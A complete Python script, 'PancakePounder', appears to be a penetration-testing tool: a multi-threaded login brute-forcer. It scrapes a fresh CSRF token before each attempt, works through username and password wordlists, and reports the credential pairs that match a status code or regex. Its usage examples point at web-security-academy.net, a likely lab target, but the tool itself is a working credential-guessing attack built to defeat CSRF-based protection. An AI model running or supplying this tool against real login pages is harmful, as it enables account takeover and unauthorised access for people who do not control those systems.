#!/usr/bin/env python3
# PancakePounder
# Updated branding from wafflesforce.py to PancakePounder.py

import argparse
import re
import sys
import time
import urllib
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

import requests

logging = __import__('logging')
logging.getLogger("urllib").setLevel(logging.ERROR)

# Colors
yellow = "\033[33m"
white = "\033[37m"
red = "\033[31m"
light_green = "\033[32m"
cyan = "\033[36m"
gold_rgb = "\033[38;2;243;164;53m"

print(gold_rgb + "PancakePounder" + white)
print("Made By iamgrepboy")

basic_example = f"""\n{cyan}[Usage Example]{white}\npython3 PancakePounder.py --host \"https://web-security-academy.net/login\" --data 'username=*USER*&password=*PASS*' -U 'users.txt' -P 'passwords.txt' --csrf-regex 'name=\"csrf\" value=\"(.*?)\">' --csrf-param 'csrf' --match-status '200-299,301,302'"""
csrf_get_example = f"""\n{cyan}[Using CSRF URL Example]{white}\npython3 PancakePounder.py --host \"https://web-security-academy.net/login\" --data 'username=*USER*&password=*PASS*' -U 'users.txt' -P 'passwords.txt' --csrf-regex 'name=\"csrf\" value=\"(.*?)\">' --csrf-param 'csrf' --csrf-url 'https://web-security-academy.net/login' --match-status '200-299,301,302'"""

parser = argparse.ArgumentParser(
    description='-> Multi-threaded Login Bruteforcer for Bypassing CSRF Token Protection',
    formatter_class=argparse.RawTextHelpFormatter,
    epilog=(basic_example + "\n" + csrf_get_example),
)
parser.add_argument('--host', type=str, help='Target URL.')
parser.add_argument('-U', '--users', type=str, nargs='?', help="Path to usernames' wordlist file.")
parser.add_argument('-u', '--user', type=str, nargs='?', help='Specify a single username to use')
parser.add_argument('-P', '--passwords', type=str, nargs='?', help="Path to passwords' wordlist file.")
parser.add_argument('-p', '--password', type=str, nargs='?', help='Specify a single password to use')
parser.add_argument('-cr', '--csrf-regex', type=str, help='Specify a Regex pattern to extract the CSRF token.')
parser.add_argument('-cp', '--csrf-param', type=str, help='Specify the CSRF token parameter name to be used in the login POST request.')
parser.add_argument('-cu', '--csrf-url', type=str, nargs='?', help='URL path to fetch the CSRF token.')
parser.add_argument('-mr', '--match-regex', type=str, nargs='?', help='Match the specified regex pattern to verify login attempts.')
parser.add_argument('-ms', '--match-status', type=str, nargs='?', help="Match specified Status codes. Default:'200-299,301,302'", default='200-299,301,302')
parser.add_argument('-d', '--data', type=str, nargs='?', help="Body parameters for the POST request. Example:'username=*USER*&password=*PASS*'")
parser.add_argument('-q', '--query', type=str, nargs='?', help='Query parameters for GET requests.')
parser.add_argument('-t', '--threads', type=int, nargs='?', help='Number of threads to use. Default: 5', default=5)
parser.add_argument('-o', '--output', type=str, nargs='?', help='Outputs results to a file.')
parser.add_argument('-vr', '--verify', action='store_true', help='Set verify to false when the site does not support SSL.')
parser.add_argument('--verbose', action='store_true', help='Increase verboseness.', default=False)

args = parser.parse_args()

url = args.host
threads = args.threads
output = args.output
verify = not args.verify
usernames_file = args.users
username = args.user
passwords_file = args.passwords
password = args.password
data = args.data
query = args.query
csrf_url = args.csrf_url
csrf_regex_pattern = args.csrf_regex
csrf_param_name = args.csrf_param
match_regex_pattern = args.match_regex
match_status = args.match_status
verbose = args.verbose

debug = False
user_list = ''
pass_list = ''
use_username_wordlist = False
use_password_wordlist = False
tries_num = 0


def print_error(message):
    print(f"{red}[ERROR]{white} - {message}")
    sys.exit()


def print_info(message):
    print(f"{cyan}[Info]{white} - {message}")


def print_input(message):
    return input(f"{yellow}[Choice]{white} - {message}")


def print_success(message):
    print(f"{light_green}[Success]{white} - {message}")


def post_request(login_url, form_data, cookies1):
    return requests.post(login_url, data=form_data, verify=verify, allow_redirects=False, cookies=cookies1)


def get_request(login_url):
    return requests.get(login_url, verify=verify)


def match_regex(pattern, text):
    return bool(re.findall(pattern, text))


def get_csrf_token():
    try:
        target = csrf_url if csrf_url else url
        response = get_request(target)
        cookie = response.cookies
        token_match = re.findall(csrf_regex_pattern, response.text)
        if not token_match:
            raise ValueError('No CSRF token found in response.')
        return [cookie, token_match[0]]
    except Exception:
        print_error(f"Couldn't get CSRF token. GET request to '{csrf_url if csrf_url else url}' failed.")


def urlencode(value):
    return urllib.parse.quote_plus(str(value))


def create_form_data(user1, password1, data1, csrf_token1):
    data1 = substitute_form_credentials(data1, urlencode(user1), urlencode(password1))
    data1 = data1 + f"&{csrf_param_name}={urlencode(csrf_token1)}"
    return convert_to_form_data(data1)


def substitute_form_credentials(data1, user1, password1):
    try:
        data1 = re.sub(r'\*USER\*', user1, data1)
        data1 = re.sub(r'\*PASS\*', password1, data1)
    except Exception:
        print_error("Couldn't find *USER* or *PASS* in your --data flag.")
        print(f"{light_green}[Correct Example]{white} -> --data 'user=*USER*&pass=*PASS*'")
    return data1


def convert_to_form_data(data1):
    return dict(item.split('=') for item in data1.split('&'))


def get_status_code(status_string):
    result = []
    for segment in status_string.split(','):
        if '-' in segment:
            start, end = segment.split('-')
            result.extend(range(int(start), int(end) + 1))
        else:
            result.append(int(segment))
    return result


def get_stat_color(stat_code):
    if 200 <= stat_code < 300 or stat_code == 302:
        color = '\033[32m'
    elif 300 <= stat_code < 400:
        color = '\033[34m'
    elif 400 <= stat_code < 500:
        color = '\033[33m'
    elif 500 <= stat_code < 600:
        color = '\033[31m'
    else:
        color = ''
    return color + str(stat_code) + white


def check_response(response1, post_response_text1, output_string1, stat1):
    if response1:
        print_success(output_string1)
        if output:
            with open(output, 'w+', encoding='utf-8') as file:
                file.write(output_string1)
        if verbose:
            print_info('Response text: \n' + post_response_text1)
    elif verbose:
        print(f"{red}[Failed attempt {stat1}]{white}")


def attempt_login(username1, password1):
    global tries_num
    tries_num += 1

    result1 = get_csrf_token()
    csrf_token = result1[1]
    csrf_cookie = result1[0]
    param = create_form_data(username1, password1, data, csrf_token)
    response = post_request(url, param, csrf_cookie)
    response_text = str(response.headers) + str(response.text)
    stat_code = response.status_code
    colored_stat = get_stat_color(int(stat_code))
    output_string = f"Login {username1}:{password1} - [{colored_stat}]"

    if match_regex_pattern and match_status:
        if stat_code in match_status:
            match_response = match_regex(match_regex_pattern, response_text)
            check_response(match_response, response_text, output_string, str(stat_code))
    elif match_regex_pattern:
        match_response = match_regex(match_regex_pattern, response_text)
        check_response(match_response, response_text, output_string, str(stat_code))
    elif match_status:
        if stat_code in match_status:
            print_success(output_string)


def create_threads(user_list1, pass_list1, executor1, attack_type):
    if attack_type == 'up':
        for username1 in user_list1:
            for password1 in pass_list1:
                executor1.submit(attempt_login, username1, password1)
    elif attack_type == 'p':
        for password1 in pass_list1:
            executor1.submit(attempt_login, user_list1, password1)
    elif attack_type == 'u':
        for username1 in user_list1:
            executor1.submit(attempt_login, username1, pass_list1)


def start_attack():
    with ThreadPoolExecutor(max_workers=threads) as executor:
        if use_password_wordlist and use_username_wordlist:
            create_threads(user_list, pass_list, executor, 'up')
        elif use_password_wordlist and not use_username_wordlist:
            create_threads(username, pass_list, executor, 'p')
        elif use_username_wordlist and not use_password_wordlist:
            create_threads(user_list, password, executor, 'u')
        else:
            print_info('You selected 1 username and 1 password.')
            times_to_send_request = int(print_input('How many times do you want to send this request? '))
            for _ in range(times_to_send_request):
                executor.submit(attempt_login, username, password)


def text_get_user():
    if usernames_file:
        return f"{cyan}[Username Wordlist]{white} - '{usernames_file}'"
    return f"{cyan}[Username]{white} - '{username}'"


def text_get_password():
    if passwords_file:
        return f"{cyan}[Password Wordlist]{white} - '{passwords_file}'"
    return f"{cyan}[Password]{white} - '{password}'"


def text_get_csrf_url():
    if csrf_url:
        return f"{cyan}[CSRF URL]{white} - '{csrf_url}'"
    return ''


if (data is None) and (query is None):
    print_error('You must use either the flag --data (POST Request) or --query (GET Request).')
if (usernames_file is None) and (username is None):
    print_error('No username or username wordlist set.')
if (passwords_file is None) and (password is None):
    print_error('No password or password wordlist set.')
if not match_status:
    print_error('You need to specify either --match-status or --match-regex.')

if usernames_file:
    use_username_wordlist = True
    with open(usernames_file, 'r', encoding='utf-8') as f:
        user_list = re.sub(r'\n$', '', f.read())
    user_list = user_list.split('\n')

if passwords_file:
    use_password_wordlist = True
    with open(passwords_file, 'r', encoding='utf-8') as f:
        pass_list = re.sub(r'\n$', '', f.read())
    pass_list = pass_list.split('\n')

if match_status:
    match_status = get_status_code(match_status)

current_date = str(datetime.now().strftime('%d/%m/%Y/ - %H:%M:%S'))
start_time = time.perf_counter()

print(f"{gold_rgb}[Starting]{white} {current_date}")
print(f"{cyan}[Settings]{white}\n {cyan}[URL]{white} - '{url}'\n {text_get_csrf_url()}\n {text_get_user()}\n {text_get_password()}\n {cyan}[Status Code]{white} - {args.match_status}\n {cyan}[Threads]{white} - {threads}")
if output:
    print(f" {cyan}[Output]{white} - '{output}'")

start_attack()
print_info(f"Attempts: {tries_num}")

end_time = time.perf_counter()
run_time = end_time - start_time
print(f"{gold_rgb}[Finished]{white} in {round(run_time, 3)}s")
